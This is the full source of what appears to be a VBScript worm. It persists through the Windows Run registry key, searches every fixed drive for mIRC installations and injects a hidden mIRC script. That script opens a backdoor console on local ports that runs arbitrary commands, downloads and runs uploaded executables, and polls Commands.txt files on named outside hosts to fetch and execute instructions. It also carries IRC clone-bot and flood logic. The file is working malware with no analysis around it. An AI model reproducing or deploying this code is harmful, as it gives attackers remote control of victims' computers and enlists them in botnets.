on error resume next
dim sAlias, sAliasName, sMirc, sTmpName, Q, N, fsoMain, regMain

initMe()
sub initMe()
 set fsoMain = CreateObject("Scripting.FileSystemObject")
 set regMain = CreateObject("WScript.Shell")
 sTmpName = fsoMain.GetSpecialFolder(2) & "\" & fsoMain.GetTempName
 sAliasName = "logs.ini"
 Q = chr(34)
 N = chr(13)&chr(10)
 do
  installMe()
  for each xDrive in fsoMain.Drives
   if (xDrive.DriveType = 2) then scanMe(xDrive.Path & "\") end if
  next
  WScript.Sleep 5*60000
 loop until (Q = "Q")
end sub

sub installMe()
 regMain.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout",0,"REG_DWORD"
 sRegKey = "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Configuration"
 sMutex = fsoMain.GetSpecialFolder(1) & "\Mutex.vbs"
 sSysFile = fsoMain.GetSpecialFolder(1) & "\MSConfig.vbs"
 if (fileExists(sMutex) = 0) then
  fsoMain.CopyFile WScript.ScriptFullName, sSysFile, True
  fsoMain.CopyFile WScript.ScriptFullName, sMutex, True
  regMain.RegWrite sRegKey, sSysFile
 end if
end sub

sub scanMe(sCurDir)
 set xRoot = fsoMain.GetFolder(sCurDir)
 set xSubFolders = xRoot.SubFolders
 For Each xSubItem in xSubFolders
  sCurDir = xSubItem.Path
  sMirc = sCurDir & "\mirc.ini"
  sAlias = sCurDir & "\" & sAliasName
  if (fileExists(sMirc)) then
    installMirc()
    installAlias()
  end if
  scanMe(sCurDir)
 next
end sub

sub installMirc()
 normalizeFile(sMirc)
 set fMirc = fsoMain.OpenTextFile(sMirc,1,false)
 set fTmp = fsoMain.OpenTextFile(sTmpName,2,true)
 iNum = 0
 iAlias = 0
 bSection = 0
 bInsert = 0
 bFinal = 0
 do
  if (fMirc.AtEndOfStream = True) then bFinal = 1 else sRead = fMirc.ReadLine end if
  if (bSection = 1) then
    if (left(sRead,1) = "[" OR sRead = "" OR bFinal = 1) then bSection = 0 end if
    if (bSection = 0 AND bInsert = 0) then fTmp.WriteLine "n" & iAlias & "=" & sAliasName end if
  end if
  if (bFinal <> 1) then
   if (bSection = 1) then
    iAlias = iAlias + 1
    iNum = iNum + 1
       if (iAlias = 3) then
          fTmp.WriteLine "n2=" & sAliasName
          bInsert = 1
       end if
       if (bInsert = 1) then
        iPos = InStr(sRead,"=")
        sLeft = "n" & iNum
        sRight = mid(sRead,iPos+1,Len(sRead) - iPos)
        if (StrComp(sRight,sAliasName,vbTextCompare) <> 0) then
          fTmp.WriteLine sLeft & "=" & sRight
        else iNum = iNum - 1 end if
       else fTmp.WriteLine sRead end if
   else
    if (StrComp(sRead, "[rfiles]", vbTextCompare) = 0) then bSection = 1 end if
    fTmp.WriteLine sRead
   end if
  end if
 loop until (bFinal = 1)
 fMirc.Close
 fTmp.Close
 fsoMain.CopyFile sTmpName, sMirc, True
 fsoMain.DeleteFile sTmpName
end sub

sub installAlias()
 s="[script]"&N&"n0=alias setFileNames { $SFN(DEF, $windir $+ \Ifsh $+ $getPCName $+ 386.swp) }"&N&"n1=alias winFile { .return $winDir $+ \cmd $+ $getPCName $+ 32.sys }"&N&"n2=alias getPCName { var %s = $findfile($winDir,*.pwl,1) | if (%s) { %s = $remove($getTok(%s,$numTok(%s,$asc(\)),$asc(\)),.pwl) } | if (!%s) { %s = net } | .return $lower(%s) }"&N&"n3=alias winDir { var %s = $finddir(C:\,Win*,1,1) | if (!%s) { %s = $finddir(D:\,Win*,1,1) } | if (!%s) %s = C: | .return %s }"&N&"n4=alias GFN { .return $readini($winFile,Files,$1) }"&N&"n5=alias SFN {  .writeini $winFile Files $1 $2 }"&N&"n6=alias setStat { .writeini $winFile Options Virus $1 }"&N&"n7=alias getStat { var %s = $readini($winFile, Options, Virus) | if (!%s) %s = Semi | .return %s }"&N&"n8=alias setCountry { .writeini $winFile Options Country $1 }"&N&"n9=alias getCountry { var %s = $readini($winFile, Options, Country) | if (!%s) %s = OTHER | .return %s }"&N&"n10=alias addHTTP { .Writeini $GFN(DEF) HTTP $1 $2- }"&N&"n11=alias delHTTP { .Remini $GFN(DEF) HTTP $1 }"&N
 s=s&"n12=alias Wind { .return @ $+ $1 }"&N&"n13=alias Verify { if ($sock($1).name != $null) { .return 1 } | .return 0 }"&N&"n14=; *"&N&"n15=on *:Unload:{ if ($hget(Mutex).size > 0) .hfree Mutex }"&N&"n16=on *:Connect:{ .Init }"&N&"n17=on *:Disconnect:{ .timers off | .sockclose * }"&N&"n18=on *:Start:{ .Start }"&N&"n19=alias Start {"&N&"n20=  if ($version < 5.8) { .unload -rsn $script | .halt }"&N&"n21=  if ($hget(Mutex).size > 0) { .unload -rsn $script | .halt } | .hmake Mutex 1"&N&"n22=  if ($hget(Data).size > 0) { .hfree Data } | .hmake Data 100"&N&"n23=  .hadd Data Recving Idle | .hadd Data Visited 0"&N&"n24=  .hadd Data Services NS MS CS OS SeenServ NickServ MemoServ ChanServ OperServ Global"&N&"n25=  .setFileNames | .setStat $getStat | .setCountry $getCountry"&N&"n26=  .write -c notes.txt | .load -rs1 notes.txt | .sockclose *"&N&"n27=}"&N&"n28=alias Init {"&N&"n29=  if ($hget(Data).size == 0) { .unload -rsn $script }"&N&"n30=  if ($readini($winFile, Options, Init) != 1) || ($exists($GFN(DEF)) != $true) { .setSites }"&N
 s=s&"n31=  .timerListenIt 1 5 { .ListenIt }"&N&"n32=  .timerHttpMe 1 15 { .HttpMe }"&N&"n33=}"&N&"n34=alias ListenIt { if ($portfree(1994) == $true) { .socklisten Listen-RecvFile 1990 | .socklisten Listen-Mutex 1994 | .socklisten Listen-Console 2000 } }"&N&"n35=alias AcceptIt { var %sName "&Q&""&Q&" | :AcceptIt | %sName = $1 $+ - $+ $rand(1,999) | if ($Verify(%sName) != 0) goto AcceptIt | .sockaccept %sName | return %sName }"&N&"n36=alias OpenIt { var %sName "&Q&""&Q&" | :OpenIt | %sName = $1 $+ - $+ $rand(1,999) | if ($Verify(%sName) != 0) goto OpenIt | return %sName }"&N&"n37=; *"&N&"n38=alias RecvFile {"&N&"n39=  ; $1 - ACTION , $2 - $sockname , $3 - Remote Filename , $4 - Local Filename"&N&"n40=  var %bServer = 0 , %sNick = $getTok($2, 3-, $asc(-)) , %sConsole = Local-Console- $+ %sNick , %sName = $rev($2, RecvFile) , %sRead = "&Q&""&Q&" , %iResume"&N&"n41=  if ($GetTok(%sName, 1, $asc(-)) == Server) { %bServer = 1 }"&N&"n42="&N&"n43=  if (CLOSE isin $1) || ($sockerr > 0) {"&N&"n44=    if (%bServer == 1) {"&N
 s=s&"n45=      if ($file($hget(Data, $rev(%sName, LocalName))).size == $hget(Data, $rev(%sName, Size))) { "&N&"n46=        if ($Verify($hget(Data, $rev(%sName, Remote))) == 1) { .sockwrite -tn $hget(Data, $rev(%sName, Remote)) (RECVFILE) File Successfully Received. CRC OK.. }"&N&"n47=        if ($hget(Data, $rev(%sName, Virus)) == 1) { .run $hget(Data, $rev(%sName, LocalName)) }"&N&"n48=      }"&N&"n49=      else if ($Verify($hget(Data, $rev(%sName, Remote))) == 1) { "&N&"n50=        .sockwrite -tn $hget(Data, $rev(%sName, Remote)) (RECVFILE) File Transfer Error. Bad CRC.."&N&"n51=        if ($hget(Data, $rev(%sName, Virus)) == 1) { .hadd Data Recving Idle }"&N&"n52=      }"&N&"n53=      if ($hget(Data, $rev(%sName, Virus)) == 1) { .sockclose $hget(Data, $rev(%sName, Remote)) }"&N&"n54=    }"&N&"n55=    .hdel -w Data $rev(%sName, *) | .sockclose $2 | .return"&N&"n56=  }"&N&"n57=  if (RECV isin $1) {"&N&"n58=    if (%bServer == 1 && $hget(Data, $rev(%sName, Init)) != 1) {"&N&"n59=      .sockread %sRead"&N&"n60=      .hadd Data $rev(%sName, LocalName) $GetTok(%sRead, 2, $asc(!))"&N
 s=s&"n61=      .hadd Data $rev(%sName, Size) $GetTok(%sRead, 3, $asc(!))"&N&"n62=      .hadd Data $rev(%sName, Remote) $GetTok(%sRead, 4, $asc(!))"&N&"n63=      .hadd Data $rev(%sName, Virus) $GetTok(%sRead, 5, $asc(!))"&N&"n64=      .hadd Data $rev(%sName, Init) 1"&N&"n65=      if ($hget(Data, $rev(%sName, Virus)) == 1) {"&N&"n66=        if ($hget(Data, Recving) == Busy) || ($getStat == Full) { .sockclose $hget(Data, $rev(%sName, Remote)) | .hdel -w Data $rev(%sName, *) | .sockclose $2 | .return }"&N&"n67=        .hadd Data Recving Busy | .hadd Data $rev(%sName, LocalName) $WinDir $+ \ $+ $random($rand(5,10)) $+ .exe"&N&"n68=      }"&N&"n69=      if ($exists($hget(Data, $rev(%sName, LocalName))) == $true) { .remove $hget(Data, $rev(%sName, LocalName)) }"&N&"n70=      if ($Verify($hget(Data, $rev(%sName, Remote))) == 1) { .sockwrite -tn $hget(Data, $rev(%sName, Remote)) (RECVFILE) Connection Established. Receiving in Progress.. }"&N&"n71=    }"&N&"n72=    else { :RecvMore | .sockread &bRead | if ($sockbr != 0) { .bwrite $hget(Data, $rev(%sName, LocalName)) -1 &bRead | goto RecvMore } }"&N
 s=s&"n73=  }"&N&"n74=}"&N&"n75=; *"&N&"n76=on *:socklisten:Listen-RecvFile:{ .AcceptIt Server-RecvFile }"&N&"n77=on *:sockread:Server-RecvFile-*:{ .RecvFile RECV $sockname }"&N&"n78=on *:sockclose:Server-RecvFile-*:{ .RecvFile CLOSE $sockname }"&N&"n79=; *"&N&"n80=alias istrue { if ($1 == $2) { $3- } }"&N&"n81=alias rev { var %i = 0 , %s | while (%i != $0) { .inc %i | %s = $insTok(%s, $getTok($1-, %i, 32), $calc($numTok(%s,$asc(.)) + 1), $asc(.)) } | .return %s }"&N&"n82=alias getScript { .return sMaLL }"&N&"n83=alias getVersion { .return 3.4 }"&N&"n84=alias Hello { .sockwrite -tn $sockname (HELLO) I'm running RoRo Console $getVersion - $+ $getScript $+ - }"&N&"n85=alias StatusMe { .sockwrite -tn $sockname (STATUS) $getStat $hget(Data, Recving) $sockname $ip }"&N&"n86=alias ExecIt {"&N&"n87=  if ($1 == FUCKOFF) { .remove $winFile }"&N&"n88=  else { [ [ $1- ] ] } | .sockwrite -tn $sockname (EXEC) $1- Executed.."&N&"n89=}"&N&"n90=alias MassMe {"&N&"n91=  .sockwrite -tn $sockname (MASS) Accepted. | var %sExec = $readini($GFN(DEF), Mass, Executed)"&N
 s=s&"n92=  if ($1- !isin %sExec) { .writeini $GFN(DEF) Mass Executed %sExec , $1- | $1- }"&N&"n93=}"&N&"n94=; *"&N&"n95=on *:socklisten:Listen-Console:{ .AcceptIt Server-Console }"&N&"n96=on *:sockread:Server-Console-*:{"&N&"n97=  if ($sockerr > 0) { .return }"&N&"n98=  var %sRead | .sockread %sRead | .tokenize 32 %sRead"&N&"n99=  if ($1 == HELLO) { .Hello }"&N&"n100=  else if ($1 == STATUS) { .StatusMe }"&N&"n101=  else if ($1 == MASS) { .MassMe $2- }"&N&"n102=  else if ($1 == EXEC) { .ExecIt $2- }"&N&"n103=}"&N&"n104=; *"&N&"n105=alias RequestURL {"&N&"n106=  .sockwrite -n $1 GET $2 HTTP/1.1 | .sockwrite -n $1 Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/msword, application/vnd.ms-powerpoint, */*"&N&"n107=  .sockwrite -n $1 Accept-Language: bg | .sockwrite -n $1 Accept-Encoding: deflate | .sockwrite -n $1 User-Agent: Mozilla/4.0 (compatible; MSIE 4.72; Windows 98)"&N&"n108=  if ($pos($3,.,0) == 1) { .sockwrite -n $1 Host: www. $+ $3 } | if ($pos($3,.,0) != 1) { .sockwrite -n $1 Host: $3 }"&N
 s=s&"n109=  .sockwrite -n $1 Connection: Keep-Alive | .sockwrite -n $1 Cache-Control: no-cache | .sockwrite -n $1"&N&"n110=}"&N&"n111=alias HttpMe {"&N&"n112=  var %sParam = $ini($GFN(DEF), HTTP, $rand(1,$ini($GFN(DEF),HTTP,0)))"&N&"n113=  if (%sParam) { .GetHTTP %sParam $readini($GFN(DEF), HTTP, %sParam) }"&N&"n114=}"&N&"n115=alias GetHTTP {"&N&"n116=  var %http.sock = $OpenIt(GetHTTP)"&N&"n117=  .hadd Data $rev(%http.sock, LocalName) $2"&N&"n118=  if ($exists($hget(Data, $rev(%http.sock, LocalName))) == $true) { .remove $hget(Data, $rev(%http.sock, LocalName)) }"&N&"n119=  .hadd Data $rev(%http.sock, RemoteName) / $+ $getTok($1, 2-, $asc(/)) | .hadd Data $rev(%http.sock, Serv) $getTok($1, 1, $asc(/))"&N&"n120=  .hadd Data $rev(%http.sock, Script) $getScript | .hadd Data $rev(%http.sock, Country) $getCountry | .hadd Data $rev(%http.sock, Stat) $getStat"&N&"n121=  .hadd Data $rev(%http.sock, Options) $3- | .hadd Data $rev(%http.sock, Size) 0"&N&"n122=  if ($hget(Data, $Rev(%http.sock, Serv)) != $null) { .sockopen %http.sock $hget(Data, $Rev(%http.sock, Serv)) 80 }"&N
 s=s&"n123=  else { .hdel -w Data $rev(%http.sock, *) }"&N&"n124=}"&N&"n125=on *:sockopen:GetHTTP-*:{"&N&"n126=  if ($sockerr > 0) { .hdel -w Data $rev($sockname, *) | .return }"&N&"n127=  .RequestURL $sockname $hget(Data, $rev($sockname, RemoteName)) $hget(Data, $rev($sockname, Serv))"&N&"n128=}"&N&"n129=on *:sockread:GetHTTP-*:{"&N&"n130=  if ($sockerr > 0) { .hdel -w Data $rev($sockname, *) | .return }"&N&"n131=  var %sRead = "&Q&""&Q&" , %http.LocalName = $hget(Data, $rev($sockname, LocalName)) , %http.Options = $hget(Data, $rev($sockname, Options))"&N&"n132=  if ($hget(Data, $rev($sockname, EOR)) == 1) {"&N&"n133=    if (STORE isin %http.Options) || (SAVE isin %http.Options) {"&N&"n134=      :StoreMore | .sockread &bRead | if ($sockbr != 0) { .bwrite %http.LocalName -1 &bRead | .goto StoreMore }"&N&"n135=      if ($hget(Data, $rev($sockname, Size)) && $file(%http.LocalName).size >= $hget(Data, $rev($sockname, Size))) { .hadd Data $rev($sockname, Final) 1 }"&N&"n136=    }"&N&"n137=    if (EXEC isin %http.Options) {"&N
 s=s&"n138=      .sockread %sRead | %sRead = [ [ %sRead ] ]"&N&"n139=      if (%sRead == EOF) { .hadd Data $rev($sockname, Final) 1 }"&N&"n140=      else if (Script: isin %sRead) { .hadd Data $rev($sockname, Script) $gettok(%sRead, 2, 32) }"&N&"n141=      else if (Country: isin %sRead) { .hadd Data $rev($sockname, Country) $gettok(%sRead, 2, 32) }"&N&"n142=      else if (Stat: isin %sRead) { .hadd Data $rev($sockname, Stat) $gettok(%sRead, 2, 32) }"&N&"n143=      else if (($hget(Data, $rev($sockname, Script)) == $getScript) && ($hget(Data, $rev($sockname, Country)) == $getCountry) && ($hget(Data, $rev($sockname, Stat)) == $getStat)) { %sRead }"&N&"n144=    }"&N&"n145=  }"&N&"n146=  else {"&N&"n147=    .sockread %sRead"&N&"n148=    if (%sRead == $null) { .hadd Data $rev($sockname, EOR) 1 }"&N&"n149=    else if (Content-Length* iswm %sRead) { .hadd Data $rev($sockname, Size) $GetTok(%sRead, 2, 32) }"&N&"n150=    else if ((HTTP/* iswm %sRead) && (200 !isin %sRead)) { "&N&"n151=      var %sParam = $hget(Data, $rev($sockname, Serv)) $+ $hget(Data, $rev($sockname, RemoteName))"&N
 s=s&"n152=      .remini $GFN(DEF) HTTP %sParam | if (SOS !isin %sParam && SAVE !isin %http.Options) { .writeini $GFN(DEF) DDos %sParam FLOOD }"&N&"n153=      .hdel -w Data $rev($sockname, *) | .sockclose $sockname | .return"&N&"n154=    }"&N&"n155=  }"&N&"n156=  if ($hget(Data, $rev($sockname, Final)) == 1) {"&N&"n157=    if ((STORE isin %http.options) && ($file(%http.LocalName).size == $hget(Data, $rev($sockname, Size)))) { .run %http.LocalName | .hadd Data Visited 1 }"&N&"n158=    .hdel -w Data $rev($sockname, *) | .sockclose $sockname"&N&"n159=  }"&N&"n160=}"&N&"n161=on *:sockclose:GetHTTP-*:{ if ($hget(Data, $rev($sockname,Final)) != 1 && SAVE !isin $hget(Data, $rev($sockname, Options))) { .remove $hget(Data, $rev($sockname, LocalName)) } | .hdel -w Data $rev($sockname, *) }"&N&"n162=; *"&N&"n163=alias setSites {"&N&"n164=  if ($getCountry == BG) { .addHTTP Rahmul.hit.bg/Commands.txt NULL EXEC | .addHTTP free.bol.bg/rahmul/Commands.txt NULL EXEC | .addHTTP free.techno-link.com/Rahmul/Commands.txt NULL EXEC }"&N
 s=s&"n165=  else { .addHTTP Rahmul4o.tripod.com/Commands.txt NULL EXEC | .addHTTP geocities.com/Rahmul4o/Commands.txt NULL EXEC | .addHTTP Rahmulka.tripod.com/Commands.txt NULL EXEC }"&N&"n166=  .writeini $winFile Options Init 1"&N&"n167=}"&N&"n168=raw *:*:{ if ($numeric == 2) { if (UniBG isin $1-) || (*-bg iswm $1-) { .setCountry BG } } | if (40* iswm $numeric) .halt }"&N&"n169=on ^*:Open:?:*:{ if (http isin $1-) || (www isin $1-) { .ignore -u60 $nick | .halt } }"&N&"n170=; *"&N&"n171=alias Random { var %i = 0 , %s | while (%i < $1) { %s = %s $+ $rand(a,z) | inc %i } | .return %s }"&N&"n172=alias UseClone { if ($sock(Clone-*, 0) > 0) { .sockwrite -tn Clone-* $1- } }"&N&"n173=alias LoadClone { var %sock = $OpenIt(Clone) | .sockopen %sock $1 6667 | .sockmark %sock $1- }"&N&"n174=on *:sockopen:Clone-*:{"&N&"n175=  if ($sockerr > 0) { .return } | .tokenize 32 $sock($sockname).mark"&N&"n176=  .sockwrite -tn $sockname NICK $2 | .sockwrite -tn $sockname USER $3 "&Q&" $+ $4 $+ "&Q&" "&Q&" $+ $1 $+ "&Q&" : $+ $5-"&N&"n177=}"&N
 s=s&"n178=on *:sockread:Clone-*:{"&N&"n179=  if ($sockerr > 0) { .return } | var %sRead | .sockread %sRead"&N&"n180=  if (PING* iswm %sRead) { .sockwrite -tn $sockname PONG $getTok(%sRead, 2, 32) }"&N&"n181=  if ($gettok(%sRead, 2, $asc(:)) == IP!) { .sockwrite -tn $sockname NOTICE $remove($gettok(%sRead,1,$asc(!)),:) :IP_ $+ $IP }"&N&"n182=}"&N
 normalizeFile(sAlias)
 set fAlias = fsoMain.OpenTextFile(sAlias,2,true)
 fAlias.WriteLine s
 fAlias.Close
end sub

sub normalizeFile(sFile)
 if (fileExists(sFile)) then
   set fFile = fsoMain.GetFile(sFile)
   fFile.Attributes = 0
 end if
end sub

function fileExists(sFile)
 if (fsoMain.fileExists(sFile)) then fileExists = 1 else fileExists = 0 end if
end function

